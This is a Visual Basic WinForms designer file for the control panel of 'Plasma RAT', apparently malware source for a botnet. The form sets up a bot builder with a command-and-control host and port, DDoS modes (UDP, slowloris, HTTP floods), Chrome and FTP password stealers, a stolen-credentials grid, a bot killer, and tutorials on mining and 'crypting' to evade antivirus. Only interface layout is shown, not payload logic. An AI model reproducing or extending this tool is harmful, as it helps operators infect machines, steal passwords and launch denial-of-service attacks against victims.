        Me.Label13.Location = New System.Drawing.Point(6, 16)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(72, 13)
        Me.Label13.TabIndex = 5
        Me.Label13.Text = "Server/DNS: "
        '
        'DNSBuild
        '
        Me.DNSBuild.Location = New System.Drawing.Point(84, 13)
        Me.DNSBuild.Name = "DNSBuild"
        Me.DNSBuild.Size = New System.Drawing.Size(160, 20)
        Me.DNSBuild.TabIndex = 6
        Me.DNSBuild.Text = "example.no-ip.org"
        Me.DNSBuild.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ToolTip1.SetToolTip(Me.DNSBuild, "The DNS/Server the port connects to." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Forward it to your IP.")
        '
        'PORTBuild
        '
        Me.PORTBuild.Location = New System.Drawing.Point(84, 41)
        Me.PORTBuild.Name = "PORTBuild"
        Me.PORTBuild.Size = New System.Drawing.Size(160, 20)
        Me.PORTBuild.TabIndex = 8
        Me.PORTBuild.Text = "6318"
        Me.PORTBuild.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ToolTip1.SetToolTip(Me.PORTBuild, "Port bot connects to")
        '
        'Label12
        '
        Me.Label12.AutoSize = True
        Me.Label12.Location = New System.Drawing.Point(6, 41)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(29, 13)
        Me.Label12.TabIndex = 7
        Me.Label12.Text = "Port:"
        '
        'Button13
        '
        Me.Button13.Image = CType(resources.GetObject("Button13.Image"), System.Drawing.Image)
        Me.Button13.ImageAlign = System.Drawing.ContentAlignment.MiddleRight
        Me.Button13.Location = New System.Drawing.Point(12, 273)
        Me.Button13.Name = "Button13"
        Me.Button13.Size = New System.Drawing.Size(337, 24)
        Me.Button13.TabIndex = 9
        Me.Button13.Text = "Build Bot Bin (.exe)"
        Me.Button13.UseVisualStyleBackColor = True
        '
        'TabPage6
        '
        Me.TabPage6.Controls.Add(Me.GroupBox5)
        Me.TabPage6.ImageIndex = 72
        Me.TabPage6.Location = New System.Drawing.Point(4, 23)
        Me.TabPage6.Name = "TabPage6"
        Me.TabPage6.Size = New System.Drawing.Size(637, 300)
        Me.TabPage6.TabIndex = 5
        Me.TabPage6.Text = "Support"
        Me.TabPage6.UseVisualStyleBackColor = True
        '
        'GroupBox5
        '
        Me.GroupBox5.Controls.Add(Me.GroupBox12)
        Me.GroupBox5.Controls.Add(Me.GroupBox8)
        Me.GroupBox5.Controls.Add(Me.Button7)
        Me.GroupBox5.Controls.Add(Me.NewsView)
        Me.GroupBox5.Controls.Add(Me.NewsHeader)
        Me.GroupBox5.Location = New System.Drawing.Point(12, 3)
        Me.GroupBox5.Name = "GroupBox5"
        Me.GroupBox5.Size = New System.Drawing.Size(617, 294)
        Me.GroupBox5.TabIndex = 1
        Me.GroupBox5.TabStop = False
        Me.GroupBox5.Text = "Support and Settings"
        '
        'GroupBox12
        '
        Me.GroupBox12.Controls.Add(Me.LowBandwidth)
        Me.GroupBox12.Controls.Add(Me.PingPong)
        Me.GroupBox12.Controls.Add(Me.ClientOnError)
        Me.GroupBox12.Controls.Add(Me.SingleConnection)
        Me.GroupBox12.Location = New System.Drawing.Point(203, 224)
        Me.GroupBox12.Name = "GroupBox12"
        Me.GroupBox12.Size = New System.Drawing.Size(406, 64)
        Me.GroupBox12.TabIndex = 22
        Me.GroupBox12.TabStop = False
        Me.GroupBox12.Text = "PlasmaRAT: Connection Settings (Advanced)"
        '
        'LowBandwidth
        '
        Me.LowBandwidth.AutoSize = True
        Me.LowBandwidth.Location = New System.Drawing.Point(238, 42)
        Me.LowBandwidth.Name = "LowBandwidth"
        Me.LowBandwidth.Size = New System.Drawing.Size(129, 17)
        Me.LowBandwidth.TabIndex = 5
        Me.LowBandwidth.Text = "Low Bandwidth Mode"
        Me.ToolTip1.SetToolTip(Me.LowBandwidth, resources.GetString("LowBandwidth.ToolTip"))
        Me.LowBandwidth.UseVisualStyleBackColor = True
        '
        'PingPong
        '
        Me.PingPong.AutoSize = True
        Me.PingPong.Checked = True
        Me.PingPong.CheckState = System.Windows.Forms.CheckState.Checked
        Me.PingPong.Location = New System.Drawing.Point(238, 19)
        Me.PingPong.Name = "PingPong"
        Me.PingPong.Size = New System.Drawing.Size(114, 17)
        Me.PingPong.TabIndex = 4
        Me.PingPong.Text = "Ping/Pong System"
        Me.ToolTip1.SetToolTip(Me.PingPong, resources.GetString("PingPong.ToolTip"))
        Me.PingPong.UseVisualStyleBackColor = True
        '
        'ClientOnError
        '
        Me.ClientOnError.AutoSize = True
        Me.ClientOnError.Checked = True
        Me.ClientOnError.CheckState = System.Windows.Forms.CheckState.Checked
        Me.ClientOnError.Location = New System.Drawing.Point(6, 42)
        Me.ClientOnError.Name = "ClientOnError"
        Me.ClientOnError.Size = New System.Drawing.Size(206, 17)
        Me.ClientOnError.TabIndex = 3
        Me.ClientOnError.Text = "Disconnect Client on Connection Error"
        Me.ToolTip1.SetToolTip(Me.ClientOnError, "Disconnects bots when connection interference is detected." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Plasma will send a " & _
                "message to the bots to reconnect in the event this occurs." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Keep this enabled " & _
                "unless instructed to disable.")
        Me.ClientOnError.UseVisualStyleBackColor = True
        '
        'SingleConnection
        '
        Me.SingleConnection.AutoSize = True
        Me.SingleConnection.Checked = True
        Me.SingleConnection.CheckState = System.Windows.Forms.CheckState.Checked
        Me.SingleConnection.Location = New System.Drawing.Point(6, 19)
        Me.SingleConnection.Name = "SingleConnection"
        Me.SingleConnection.Size = New System.Drawing.Size(226, 17)
        Me.SingleConnection.TabIndex = 2
        Me.SingleConnection.Text = "Reject Multiple Connections from Single IP"
        Me.ToolTip1.SetToolTip(Me.SingleConnection, "Rejects multiple connections from a single IP. Stops dupe bots who disconnected u" & _
                "nexpectedly." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Keeping this enabled allows Plasma to better handle disconnects." & _
                "")
        Me.SingleConnection.UseVisualStyleBackColor = True
        '
        'GroupBox8
        '
        Me.GroupBox8.Controls.Add(Me.Label23)
        Me.GroupBox8.Controls.Add(Me.Button19)
        Me.GroupBox8.Controls.Add(Me.Button18)
        Me.GroupBox8.Controls.Add(Me.Button17)
        Me.GroupBox8.Controls.Add(Me.Label22)
        Me.GroupBox8.Controls.Add(Me.Label21)
        Me.GroupBox8.Controls.Add(Me.Button12)
        Me.GroupBox8.Controls.Add(Me.Button11)
        Me.GroupBox8.Controls.Add(Me.Button10)
        Me.GroupBox8.Controls.Add(Me.Button9)
        Me.GroupBox8.Location = New System.Drawing.Point(7, 20)
        Me.GroupBox8.Name = "GroupBox8"
        Me.GroupBox8.Size = New System.Drawing.Size(190, 268)
        Me.GroupBox8.TabIndex = 21
        Me.GroupBox8.TabStop = False
        Me.GroupBox8.Text = "Tutorials and Support"
        '
        'Label23
        '
        Me.Label23.AutoSize = True
        Me.Label23.Location = New System.Drawing.Point(23, 245)
        Me.Label23.Name = "Label23"
        Me.Label23.Size = New System.Drawing.Size(135, 13)
        Me.Label23.TabIndex = 10
        Me.Label23.Text = "Coded by KFC Watermelon"
        '
        'Button19
        '
        Me.Button19.Location = New System.Drawing.Point(6, 19)
        Me.Button19.Name = "Button19"
        Me.Button19.Size = New System.Drawing.Size(175, 23)
        Me.Button19.TabIndex = 9
        Me.Button19.Text = "Open Support Forums"
        Me.Button19.UseVisualStyleBackColor = True
        '
        'Button18
        '
        Me.Button18.Location = New System.Drawing.Point(6, 219)
        Me.Button18.Name = "Button18"
        Me.Button18.Size = New System.Drawing.Size(175, 23)
        Me.Button18.TabIndex = 8
        Me.Button18.Text = "Product FAQs (Readme!)"
        Me.Button18.UseVisualStyleBackColor = True
        '
        'Button17
        '
        Me.Button17.Location = New System.Drawing.Point(6, 190)
        Me.Button17.Name = "Button17"
        Me.Button17.Size = New System.Drawing.Size(175, 23)
        Me.Button17.TabIndex = 7
        Me.Button17.Text = "Crypting Guide"
        Me.Button17.UseVisualStyleBackColor = True
        '
        'Label22
        '
        Me.Label22.AutoSize = True
        Me.Label22.Location = New System.Drawing.Point(6, 174)
        Me.Label22.Name = "Label22"
        Me.Label22.Size = New System.Drawing.Size(62, 13)
        Me.Label22.TabIndex = 6
        Me.Label22.Text = "Information:"
        '
        'Label21
        '
        Me.Label21.AutoSize = True
        Me.Label21.Location = New System.Drawing.Point(6, 49)
        Me.Label21.Name = "Label21"
        Me.Label21.Size = New System.Drawing.Size(50, 13)
        Me.Label21.TabIndex = 5
        Me.Label21.Text = "Tutorials:"
        '
        'Button12
        '
        Me.Button12.Location = New System.Drawing.Point(6, 148)
        Me.Button12.Name = "Button12"
        Me.Button12.Size = New System.Drawing.Size(175, 23)
        Me.Button12.TabIndex = 4
        Me.Button12.Text = "Complete Miner Tutorial"
        Me.Button12.UseVisualStyleBackColor = True
        '
        'Button11
        '
        Me.Button11.Location = New System.Drawing.Point(6, 120)
        Me.Button11.Name = "Button11"
        Me.Button11.Size = New System.Drawing.Size(175, 23)
        Me.Button11.TabIndex = 3
        Me.Button11.Text = "DDoS Info and Walkthrough"
        Me.Button11.UseVisualStyleBackColor = True
        '
        'Button10
        '
        Me.Button10.Location = New System.Drawing.Point(6, 91)
        Me.Button10.Name = "Button10"
        Me.Button10.Size = New System.Drawing.Size(175, 23)
        Me.Button10.TabIndex = 2
        Me.Button10.Text = "Basic Commands Guide"
        Me.Button10.UseVisualStyleBackColor = True
        '
        'Button9
        '
        Me.Button9.Location = New System.Drawing.Point(6, 65)
        Me.Button9.Name = "Button9"
        Me.Button9.Size = New System.Drawing.Size(175, 23)
        Me.Button9.TabIndex = 1
        Me.Button9.Text = "Setting up PlasmaRAT"
        Me.Button9.UseVisualStyleBackColor = True
        '
        'Button7
        '
        Me.Button7.Enabled = False
        Me.Button7.Location = New System.Drawing.Point(534, 0)
        Me.Button7.Name = "Button7"
        Me.Button7.Size = New System.Drawing.Size(75, 23)
        Me.Button7.TabIndex = 20
        Me.Button7.UseVisualStyleBackColor = True
        Me.Button7.Visible = False
        '
        'NewsView
        '
        Me.NewsView.BackColor = System.Drawing.SystemColors.Window
        Me.NewsView.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.NewsView.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader16, Me.ColumnHeader17})
        Me.NewsView.Cursor = System.Windows.Forms.Cursors.Hand
        Me.NewsView.Font = New System.Drawing.Font("Verdana", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Underline), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.NewsView.FullRowSelect = True
        Me.NewsView.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None
        Me.NewsView.Items.AddRange(New System.Windows.Forms.ListViewItem() {ListViewItem4})
        Me.NewsView.Location = New System.Drawing.Point(209, 46)
        Me.NewsView.MultiSelect = False
        Me.NewsView.Name = "NewsView"
        Me.NewsView.OwnerDraw = True
        Me.NewsView.Scrollable = False
        Me.NewsView.Size = New System.Drawing.Size(402, 172)
        Me.NewsView.TabIndex = 17
        Me.NewsView.UseCompatibleStateImageBehavior = False
        Me.NewsView.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader16
        '
        Me.ColumnHeader16.Text = ""
        Me.ColumnHeader16.Width = 76
        '
        'ColumnHeader17
        '
        Me.ColumnHeader17.Text = ""
        Me.ColumnHeader17.Width = 203
        '
        'NewsHeader
        '
        Me.NewsHeader.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.NewsHeader.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.NewsHeader.Location = New System.Drawing.Point(209, 19)
        Me.NewsHeader.Name = "NewsHeader"
        Me.NewsHeader.Size = New System.Drawing.Size(402, 21)
        Me.NewsHeader.TabIndex = 16
        Me.NewsHeader.Text = "Plasma RAT News and Information"
        '
        'Timer1
        '
        '
        'Ping
        '
        Me.Ping.Interval = 60000
        '
        'StatusStrip1
        '
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.BotsOnline, Me.SelectedBots, Me.BotPeak, Me.ToolStripStatusLabel3, Me.StartListening})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 331)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(646, 22)
        Me.StatusStrip1.TabIndex = 10
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'BotsOnline
        '
        Me.BotsOnline.Image = CType(resources.GetObject("BotsOnline.Image"), System.Drawing.Image)
        Me.BotsOnline.Name = "BotsOnline"
        Me.BotsOnline.Size = New System.Drawing.Size(87, 17)
        Me.BotsOnline.Text = "Bots Online:"
        Me.BotsOnline.ToolTipText = "The total amount of bots online"
        '
        'SelectedBots
        '
        Me.SelectedBots.Image = CType(resources.GetObject("SelectedBots.Image"), System.Drawing.Image)
        Me.SelectedBots.Name = "SelectedBots"
        Me.SelectedBots.Size = New System.Drawing.Size(96, 17)
        Me.SelectedBots.Text = "Selected Bots:"
        '
        'BotPeak
        '
        Me.BotPeak.Image = CType(resources.GetObject("BotPeak.Image"), System.Drawing.Image)
        Me.BotPeak.Name = "BotPeak"
        Me.BotPeak.Size = New System.Drawing.Size(60, 17)
        Me.BotPeak.Text = "Peak: 0"
        Me.BotPeak.ToolTipText = "The peak amount of bots online."
        '
        'ToolStripStatusLabel3
        '
        Me.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3"
        Me.ToolStripStatusLabel3.Size = New System.Drawing.Size(196, 17)
        Me.ToolStripStatusLabel3.Text = "                                                               "
        '
        'StartListening
        '
        Me.StartListening.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ConnectionHelpToolStripMenuItem, Me.PortForwardingTestToolStripMenuItem})
        Me.StartListening.Image = CType(resources.GetObject("StartListening.Image"), System.Drawing.Image)
        Me.StartListening.ImageTransparentColor = System.Drawing.Color.Magenta
        Me.StartListening.Name = "StartListening"
        Me.StartListening.Size = New System.Drawing.Size(112, 20)
        Me.StartListening.Text = "Listen on Port"
        '
        'ConnectionHelpToolStripMenuItem
        '
        Me.ConnectionHelpToolStripMenuItem.Name = "ConnectionHelpToolStripMenuItem"
        Me.ConnectionHelpToolStripMenuItem.Size = New System.Drawing.Size(184, 22)
        Me.ConnectionHelpToolStripMenuItem.Text = "Connection Help"
        '
        'PortForwardingTestToolStripMenuItem
        '
        Me.PortForwardingTestToolStripMenuItem.Name = "PortForwardingTestToolStripMenuItem"
        Me.PortForwardingTestToolStripMenuItem.Size = New System.Drawing.Size(184, 22)
        Me.PortForwardingTestToolStripMenuItem.Text = "Port Forwarding Test"
        '
        'BotListView
        '
        Me.BotListView.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader6, Me.ColumnHeader7, Me.ColumnHeader8, Me.ColumnHeader9, Me.ColumnHeader11, Me.ColumnHeader12, Me.ColumnHeader18})
        Me.BotListView.ContextMenuStrip = Me.MainView
        Me.BotListView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.BotListView.FullRowSelect = True
        Me.BotListView.GridLines = True
        Me.BotListView.Location = New System.Drawing.Point(3, 3)
        Me.BotListView.Name = "BotListView"
        Me.BotListView.Size = New System.Drawing.Size(631, 294)
        Me.BotListView.TabIndex = 1
        Me.BotListView.UseCompatibleStateImageBehavior = False
        Me.BotListView.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader6
        '
        Me.ColumnHeader6.Text = "IP Address"
        Me.ColumnHeader6.Width = 106
        '
        'ColumnHeader7
        '
        Me.ColumnHeader7.Text = "Country"
        Me.ColumnHeader7.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ColumnHeader7.Width = 56
        '
        'ColumnHeader8
        '
        Me.ColumnHeader8.Text = "Operating System"
        Me.ColumnHeader8.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ColumnHeader8.Width = 120
        '
        'ColumnHeader9
        '
        Me.ColumnHeader9.Text = "PC Username"
        Me.ColumnHeader9.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ColumnHeader9.Width = 138
        '
        'ColumnHeader11
        '
        Me.ColumnHeader11.Text = "CPU"
        Me.ColumnHeader11.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'ColumnHeader12
        '
        Me.ColumnHeader12.Text = "Account"
        Me.ColumnHeader12.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'ColumnHeader18
        '
        Me.ColumnHeader18.Text = "Version"
        Me.ColumnHeader18.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'LogView
        '
        Me.LogView.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader13, Me.ColumnHeader14})
        Me.LogView.ContextMenuStrip = Me.BotLogsRightClick
        Me.LogView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.LogView.FullRowSelect = True
        Me.LogView.GridLines = True
        Me.LogView.Location = New System.Drawing.Point(0, 0)
        Me.LogView.Name = "LogView"
        Me.LogView.Size = New System.Drawing.Size(637, 300)
        Me.LogView.TabIndex = 10
        Me.LogView.UseCompatibleStateImageBehavior = False
        Me.LogView.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader13
        '
        Me.ColumnHeader13.Text = "User"
        Me.ColumnHeader13.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ColumnHeader13.Width = 135
        '
        'ColumnHeader14
        '
        Me.ColumnHeader14.Text = "Log"
        Me.ColumnHeader14.Width = 471
        '
        'CommandsListView
        '
        Me.CommandsListView.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader10})
        Me.CommandsListView.ContextMenuStrip = Me.Commands
        Me.CommandsListView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.CommandsListView.FullRowSelect = True
        Me.CommandsListView.GridLines = True
        Me.CommandsListView.Location = New System.Drawing.Point(0, 0)
        Me.CommandsListView.Name = "CommandsListView"
        Me.CommandsListView.Size = New System.Drawing.Size(637, 300)
        Me.CommandsListView.TabIndex = 13
        Me.CommandsListView.UseCompatibleStateImageBehavior = False
        Me.CommandsListView.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader10
        '
        Me.ColumnHeader10.Text = "Command"
        Me.ColumnHeader10.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ColumnHeader10.Width = 595
        '
        'PasswordListView
        '
        Me.PasswordListView.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader3, Me.ColumnHeader4, Me.ColumnHeader5})
        Me.PasswordListView.ContextMenuStrip = Me.PasswordRightClick
        Me.PasswordListView.Dock = System.Windows.Forms.DockStyle.Fill
        Me.PasswordListView.FullRowSelect = True
        Me.PasswordListView.GridLines = True
        Me.PasswordListView.Location = New System.Drawing.Point(0, 0)
        Me.PasswordListView.Name = "PasswordListView"
        Me.PasswordListView.Size = New System.Drawing.Size(637, 300)
        Me.PasswordListView.TabIndex = 2
        Me.PasswordListView.UseCompatibleStateImageBehavior = False
        Me.PasswordListView.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Website"
        Me.ColumnHeader3.Width = 360
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "Username"
        Me.ColumnHeader4.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ColumnHeader4.Width = 120
        '
        'ColumnHeader5
        '
        Me.ColumnHeader5.Text = "Password"
        Me.ColumnHeader5.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ColumnHeader5.Width = 120
        '
        'Main
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(646, 353)
        Me.Controls.Add(Me.TabControl1)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Main"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Plasma RAT"
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.MainView.ResumeLayout(False)
        Me.TabPage2.ResumeLayout(False)
        Me.GroupBox4.ResumeLayout(False)
        Me.GroupBox4.PerformLayout()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.TabPage4.ResumeLayout(False)
        Me.BotLogsRightClick.ResumeLayout(False)
        Me.TabPage3.ResumeLayout(False)
        Me.Commands.ResumeLayout(False)
        Me.TabPage5.ResumeLayout(False)
        Me.PasswordRightClick.ResumeLayout(False)
        Me.TabPage8.ResumeLayout(False)
        Me.GroupBox9.ResumeLayout(False)
        Me.GroupBox9.PerformLayout()
        Me.GroupBox10.ResumeLayout(False)
        Me.GroupBox10.PerformLayout()
        Me.TabPage7.ResumeLayout(False)
        Me.GroupBox13.ResumeLayout(False)
        Me.GroupBox13.PerformLayout()
        Me.GroupBox7.ResumeLayout(False)
        Me.GroupBox7.PerformLayout()
        Me.GroupBox11.ResumeLayout(False)
        Me.GroupBox11.PerformLayout()
        Me.GroupBox6.ResumeLayout(False)
        Me.GroupBox6.PerformLayout()
        Me.TabPage6.ResumeLayout(False)
        Me.GroupBox5.ResumeLayout(False)
        Me.GroupBox5.PerformLayout()
        Me.GroupBox12.ResumeLayout(False)
        Me.GroupBox12.PerformLayout()
        Me.GroupBox8.ResumeLayout(False)
        Me.GroupBox8.PerformLayout()
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents TabControl1 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage6 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents UDP As System.Windows.Forms.RadioButton
    Friend WithEvents arme As System.Windows.Forms.RadioButton
    Friend WithEvents slowloris As System.Windows.Forms.RadioButton
    Friend WithEvents httpget As System.Windows.Forms.RadioButton
    Friend WithEvents Button2 As System.Windows.Forms.Button
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents time As System.Windows.Forms.TextBox
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents port As System.Windows.Forms.TextBox
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents target As System.Windows.Forms.TextBox
    Friend WithEvents threads As System.Windows.Forms.TextBox
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents ListView2 As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents Button3 As System.Windows.Forms.Button
    Friend WithEvents TextBox5 As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents bwflood As System.Windows.Forms.RadioButton
    Friend WithEvents httppost As System.Windows.Forms.RadioButton
    Friend WithEvents Label8 As System.Windows.Forms.Label
    Friend WithEvents condis As System.Windows.Forms.RadioButton
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents GroupBox4 As System.Windows.Forms.GroupBox
    Friend WithEvents ListView3 As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents Description As System.Windows.Forms.Label
    Friend WithEvents data As System.Windows.Forms.TextBox
    Friend WithEvents Label9 As System.Windows.Forms.Label
    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
    Friend WithEvents TreeView2 As System.Windows.Forms.TreeView
    Friend WithEvents ColumnHeader6 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader7 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader8 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader9 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader13 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader14 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader5 As System.Windows.Forms.ColumnHeader
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents info As System.Windows.Forms.Label
    Friend WithEvents use As System.Windows.Forms.Label
    Friend WithEvents ColumnHeader11 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader12 As System.Windows.Forms.ColumnHeader
    Friend WithEvents MainView As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents GeneralCollection As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents WebsiteVisitor As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents BotKiller As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Stealer As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator1 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents BotInfo As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StopToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AdvancedInfo As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StartToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StopToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MuteBoats As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ExecuteFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UpdateToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents OpenVisibleToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents OpenHiddenToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RunBotKillerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents EnableProactiveBotKillerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DisableProactiveBotKillerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ChromeStealerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FTPStealerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AVInfoToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents EnableMuteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DisableMuteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator3 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents ToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem3 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ImageList1 As System.Windows.Forms.ImageList
    Friend WithEvents ColumnHeader10 As System.Windows.Forms.ColumnHeader
    Friend WithEvents GroupBox5 As System.Windows.Forms.GroupBox
    Friend WithEvents NewsHeader As System.Windows.Forms.TextBox
    Friend WithEvents NewsView As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader16 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader17 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader18 As System.Windows.Forms.ColumnHeader
    Friend WithEvents Ping As System.Windows.Forms.Timer
    Friend WithEvents Button7 As System.Windows.Forms.Button
    Friend WithEvents SelectedOnly As System.Windows.Forms.CheckBox
    Friend WithEvents Commands As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ResendCommandToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SendCommandOnConnectToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TabPage7 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox6 As System.Windows.Forms.GroupBox
    Friend WithEvents Label13 As System.Windows.Forms.Label
    Friend WithEvents Button13 As System.Windows.Forms.Button
    Friend WithEvents DNSBuild As System.Windows.Forms.TextBox
